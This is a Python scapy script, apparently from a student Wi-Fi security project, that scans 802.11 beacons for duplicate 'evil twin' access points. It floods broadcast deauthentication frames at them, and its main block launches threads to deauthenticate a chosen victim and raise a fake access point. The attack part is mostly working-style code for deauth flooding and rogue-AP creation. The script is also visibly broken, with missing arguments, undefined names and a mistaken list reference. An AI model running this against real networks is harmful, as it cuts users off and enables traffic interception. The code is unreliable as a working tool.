import os
import re
import csv
import subprocess
from tabnanny import verbose
from scapy.layers.l2 import ARP, Ether
from WifiAdapter import *
import Deauthenticate
import Twin_create
import Attack
from scapy import all as sc
import time
from threading import Thread

AllAvialableNetworks = []
DuplicateNetworks = []
NonDuplicateNetworks = []

def WifiSniffingHandler(packet):
    #if packet end with 11 like 802.11
    if packet.haslayer(sc.Dot11):
        #type -menegment subtype-beacon
        if packet.type==0 and packet.subtype==8:
            #address 2 - transmitter.
            exist = False
            # add the packet to AvialableWifiNetworks if not already in
            for pkt in DuplicateNetworks:
                if packet.addr2 == pkt.addr2:
                    exist = True
            if not exist:
                AllAvialableNetworks.append(packet)
                # print("Access Point Mac: %s with SSID:%s" %(packet.addr2 ,packet.info))


def FindDuplicateNetworks(Wifiadapter):
    print("\nScanning for malicious wireless netwroks...\n")
    #  iface = the interfaces that we would like to sniff on
    # prn = allows us to pass a function that executes with each packet sniffed
    sc.sniff(iface=Wifiadapter, prn=WifiSniffingHandler , timeout = 90)
    for net in Attack.AvialableWifiNetworks:
        if net.addr2 in NonDuplicateNetworks:
            DuplicateNetworks.append(net)
        else:
            NonDuplicateNetworks.append(net.addr2)
    for net in Attack.AvialableWifiNetworks:
        for dup_net in DuplicateNetworks:
            if net.info is dup_net.info and net.addr2 is not dup_net.addr2:
                DuplicateNetworks.append(net)


def DisconnectAll(network , Wifiadapter):
    client_mac = 'ff:ff:ff:ff:ff:ff'  # to disconnect all the internet devices
    client_receive_packet = RadioTap() / Dot11(addr1=client_mac, addr2=network.addr2,
                                               addr3=network.addr2) / Dot11Deauth()
    access_point_receive_packet = RadioTap() / Dot11(addr1=network.addr2, addr2=client_mac,
                                                     addr3=client_mac) / Dot11Deauth()
    sendp(client_receive_packet, count=100, iface=Wifiadapter , verbose = 0)
    sendp(access_point_receive_packet, count=100, iface=Wifiadapter , verbose = 0)

    return 0


if __name__ == "__main__":

    #finding wifi adapter
    Wifiadapter = WifiAdapter.WifiAdapterFinder()
    #changing adapter to monitor mode
    WifiAdapter.MonitorMode(WifiAdapter)
    FindDuplicateNetworks()
    for net in DuplicateNetworks:
        DisconnectAll(net)
    


    print("wifi adapter is : " , WifiAdapter)
    print("chosen wifi mac address is : " , ChosenWifiMA)
    print("chosen wifi ssid is : " , ChosenWifiSSID)
    print("chosen client mac address is : " , ChosenWifiSSID)
    #create thread that disconnect the victim from the chosen wifi 
    Deauthenticate_thread = Thread(target=DA.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])

    #create thread that create an fake wireless network (evil twin)
    TwinNet_thread = Thread(target = TC.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])

    Deauthenticate_thread.start()
    TwinNet_thread.start()

    TwinNet_thread.join()
    Deauthenticate_thread.join()